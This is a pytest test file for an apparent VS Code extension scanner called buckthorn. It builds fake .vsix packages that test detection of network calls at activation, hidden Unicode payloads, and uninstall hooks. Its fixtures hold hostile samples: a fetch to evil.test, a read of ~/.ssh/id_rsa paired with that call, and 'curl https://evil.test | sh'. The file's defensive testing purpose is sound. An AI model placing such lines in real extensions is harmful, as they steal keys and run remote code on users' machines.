import json
import zipfile
from pathlib import Path

import pytest

from buckthorn.cli import main
from buckthorn.findings import verdict
from buckthorn.scan import scan_artifact

FETCH = "fetch('https://evil.test/x');\n"
# What GlassWorm hides its payload in: Unicode variation selectors, which no
# editor draws.
INVISIBLE = "".join(chr(0xFE00 + i % 16) + chr(0xE0100 + i % 240) for i in range(40))


def _rules(findings):
    return sorted(f.rule_id for f in findings)


@pytest.fixture
def make_vsix(tmp_path: Path):
    """Write a .vsix: a zip with the extension under extension/, as vsce makes.

    manifest=None leaves package.json out; a str gives its raw text.
    """

    def _make(
        files: dict[str, str | bytes] | None = None,
        manifest: dict | str | None = "default",
        name: str = "pub.ext-1.0.0.vsix",
    ) -> Path:
        manifest = {} if manifest == "default" else manifest
        members: dict[str, str | bytes] = {"extension.vsixmanifest": "<PackageManifest/>"}
        if isinstance(manifest, dict):
            full = {"name": "ext", "publisher": "pub", "version": "1.0.0", **manifest}
            members["extension/package.json"] = json.dumps(full)
        elif isinstance(manifest, str):
            members["extension/package.json"] = manifest
        members.update({f"extension/{k}": v for k, v in (files or {}).items()})
        path = tmp_path / name
        with zipfile.ZipFile(path, "w") as zf:
            for member, data in members.items():
                zf.writestr(member, data)
        return path

    return _make


# The manifest.


def test_extension_with_no_code_is_clean(make_vsix):
    # A theme or a language grammar: nothing runs.
    assert scan_artifact(make_vsix({"themes/dark.json": "{}"})) == []


@pytest.mark.parametrize("manifest", [None, "{not json"])
def test_missing_or_unreadable_package_json_is_flagged(make_vsix, manifest):
    findings = scan_artifact(make_vsix(manifest=manifest))
    assert "BKT-VSX-META-001" in _rules(findings)
    assert verdict(findings) == "flagged"


def test_extensions_it_installs_too_are_a_note(make_vsix):
    manifest = {"extensionDependencies": ["a.b"], "extensionPack": ["c.d"]}
    findings = scan_artifact(make_vsix(manifest=manifest))
    assert _rules(findings) == ["BKT-VSX-DEPS-001"]
    assert "a.b" in findings[0].message and "c.d" in findings[0].message
    assert verdict(findings) == "clean"


# Code that runs when the extension activates.


def test_network_at_the_top_of_main_is_high(make_vsix):
    findings = scan_artifact(make_vsix({"out/main.js": FETCH}, {"main": "./out/main.js"}))
    assert _rules(findings) == ["BKT-VSX-ACTIVATE-001"]
    assert "at activation" in findings[0].message
    assert findings[0].file_path == "extension/out/main.js"
    assert verdict(findings) == "flagged"


@pytest.mark.parametrize(
    "code",
    [
        f"exports.activate = function (context) {{ {FETCH} }};",
        f"function activate(context) {{ {FETCH} }}\nmodule.exports = {{ activate }};",
        f"export async function activate(context) {{ {FETCH} }}",
        f"exports.deactivate = () => {{ {FETCH} }};",
    ],
)
def test_network_in_activate_or_deactivate_is_high(make_vsix, code):
    findings = scan_artifact(make_vsix({"out/main.js": code}, {"main": "./out/main.js"}))
    assert _rules(findings) == ["BKT-VSX-ACTIVATE-001"]


@pytest.mark.parametrize(
    "code",
    [
        # esbuild: exports are getters on an object module.exports is made from.
        "var x_exports = {};\n__export(x_exports, { activate: () => activate });\n"
        f"module.exports = __toCommonJS(x_exports);\nasync function activate(c) {{ {FETCH} }}",
        # webpack, minified: the same getters, inside the bundle's wrapper.
        "(() => { var e = {}; n.d(e, { activate: () => Xe, deactivate: () => Ye });\n"
        f"function Xe(c) {{ {FETCH} }} function Ye() {{}} module.exports = e; }})();",
        # esbuild, minified, with its never-run hint for Node's export names.
        "var g = {}; j1(g, { activate: () => d$ }); module.exports = z1(g);\n"
        f"async function d$(e) {{ {FETCH} }}\n0 && (module.exports = {{ activate }});",
        # webpack's module function, given the exports object as a parameter.
        f"(function (e, t, n) {{ t.activate = async function (e) {{ {FETCH} }}; }})(m, m.exports);",
    ],
)
def test_activate_in_a_bundle_is_found(make_vsix, code):
    findings = scan_artifact(make_vsix({"dist/ext.js": code}, {"main": "./dist/ext.js"}))
    assert _rules(findings) == ["BKT-VSX-ACTIVATE-001"]


def test_member_names_are_read_as_unzipped(make_vsix, tmp_path):
    # extension/./out/main.js unzips to extension/out/main.js.
    path = tmp_path / "odd.vsix"
    with zipfile.ZipFile(path, "w") as zf:
        zf.writestr("extension/package.json", json.dumps({"main": "./out/main.js"}))
        zf.writestr("extension/./out/main.js", FETCH)
    assert _rules(scan_artifact(path)) == ["BKT-VSX-ACTIVATE-001"]


def test_an_entry_that_is_not_shipped_is_not_verified(make_vsix):
    findings = scan_artifact(make_vsix({"out/other.js": FETCH}, {"main": "./out/main.js"}))
    assert _rules(findings) == ["BKT-SKIP-003"]
    assert verdict(findings) == "not_verified"


def test_a_nested_exports_name_assigned_a_function_name_is_followed(make_vsix):
    code = f"(function (e, t) {{ t.activate = go; function go() {{ {FETCH} }} }})(m, m.exports);"
    findings = scan_artifact(make_vsix({"main.js": code}, {"main": "main.js"}))
    assert _rules(findings) == ["BKT-VSX-ACTIVATE-001"]


def test_activate_that_cannot_be_found_is_not_verified(make_vsix):
    # Named, but not by any export shape the reader knows.
    code = (
        f"const api = {{}};\napi['acti' + 'vate'] = function () {{ {FETCH} }};\n"
        "module.exports = api;"
    )
    findings = scan_artifact(make_vsix({"main.js": code + "// activate\n"}, {"main": "main.js"}))
    assert _rules(findings) == ["BKT-SKIP-003"]
    assert "activate" in findings[0].message
    assert verdict(findings) == "not_verified"


def test_a_command_handler_nothing_calls_at_activation_is_not_counted(make_vsix):
    code = f"exports.onCommand = function () {{ {FETCH} }};\nexports.activate = function () {{}};"
    findings = scan_artifact(make_vsix({"out/main.js": code}, {"main": "./out/main.js"}))
    assert findings == []


def test_code_main_loads_is_followed(make_vsix):
    files = {"out/main.js": "require('./net');", "out/net.js": FETCH}
    findings = scan_artifact(make_vsix(files, {"main": "./out/main"}))
    assert _rules(findings) == ["BKT-VSX-ACTIVATE-001"]
    assert findings[0].file_path == "extension/out/net.js"


def test_browser_entry_is_read_too(make_vsix):
    findings = scan_artifact(make_vsix({"dist/web.js": FETCH}, {"browser": "./dist/web.js"}))
    assert _rules(findings) == ["BKT-VSX-ACTIVATE-001"]


def test_credentials_and_network_at_activation_is_critical(make_vsix):
    code = "const fs = require('fs');\nfs.readFileSync(require('os').homedir() + '/.ssh/id_rsa');\n"
    findings = scan_artifact(make_vsix({"main.js": code + FETCH}, {"main": "main.js"}))
    assert "BKT-VSX-ACTIVATE-008" in _rules(findings)


def test_native_addon_main_loads_is_not_verified(make_vsix):
    files = {"main.js": "require('./bin/win.node');", "bin/win.node": b"MZ\x90\x00"}
    findings = scan_artifact(make_vsix(files, {"main": "main.js"}))
    assert _rules(findings) == ["BKT-SKIP-003"]
    assert verdict(findings) == "not_verified"


# Invisible code.


def test_invisible_characters_in_code_that_runs_are_high(make_vsix):
    code = f"const s = `{INVISIBLE}`;\n"
    findings = scan_artifact(make_vsix({"main.js": code}, {"main": "main.js"}))
    assert _rules(findings) == ["BKT-VSX-HIDE-001"]
    assert verdict(findings) == "flagged"


@pytest.mark.parametrize("text", ["\u2764\ufe0f", "a\u200bb", "\U0001f468\u200d\U0001f469"])
def test_an_emoji_or_a_lone_zero_width_space_is_not_invisible_code(make_vsix, text):
    findings = scan_artifact(make_vsix({"main.js": f"const s = '{text}';\n"}, {"main": "main.js"}))
    assert findings == []


# The uninstall hook.


def test_uninstall_script_is_medium_and_its_code_is_read(make_vsix):
    manifest = {"scripts": {"vscode:uninstall": "node ./out/uninstall.js"}}
    findings = scan_artifact(make_vsix({"out/uninstall.js": FETCH}, manifest))
    assert _rules(findings) == ["BKT-VSX-SCRIPT-001", "BKT-VSX-UNINSTALL-001"]
    assert verdict(findings) == "flagged"


def test_scripts_vs_code_never_runs_are_ignored(make_vsix):
    manifest = {"scripts": {"vscode:prepublish": "curl https://evil.test | sh", "postinstall": "x"}}
    assert scan_artifact(make_vsix(manifest=manifest)) == []


# The command line.


def test_cli_scans_a_vsix(make_vsix, capsys):
    path = make_vsix({"out/main.js": FETCH}, {"main": "./out/main.js"})
    assert main(["scan", str(path)]) == 1
    assert "BKT-VSX-ACTIVATE-001" in capsys.readouterr().out
